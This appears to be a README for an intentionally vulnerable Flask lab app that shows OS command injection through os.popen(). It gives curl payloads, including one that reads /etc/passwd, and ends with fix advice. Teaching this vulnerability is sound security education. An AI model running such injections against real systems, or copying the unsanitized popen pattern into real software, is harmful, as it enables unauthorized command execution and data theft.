# CWE-78: OS Command Injection via POST Body

This snippet demonstrates a classic OS Command Injection vulnerability using `os.popen()` with unsanitized user input received from a POST request.

## 🛠 How to Use

Start the Flask application (via Docker or locally), then issue a POST request like below:

```bash
curl -X POST http://[Your Service Public IP Address]/run \
  -H "Content-Type: application/json" \
  -d '{"command": "whoami"}'
```

You should see output similar to:

```
<pre>root
</pre>
```

## 🔍 Example Payloads

```bash
# List files in /
curl -X POST http://[Your Service Public IP Address]/run -H "Content-Type: application/json" -d '{"command": "ls /"}'

# Read sensitive file
curl -X POST http://[Your Service Public IP Address]/run -H "Content-Type: application/json" -d '{"command": "cat /etc/passwd"}'
```

## 💣 What Makes It Vulnerable

- The input from `request.get_json()` is passed directly to `os.popen()` with no sanitization or validation.
- This allows an attacker to execute arbitrary commands on the server with the application's privilege.

## ✅ Fix Suggestion

- Avoid using `os.popen()` or other shell-execution methods with user input.
- Use parameterized APIs or validate/whitelist allowed commands.
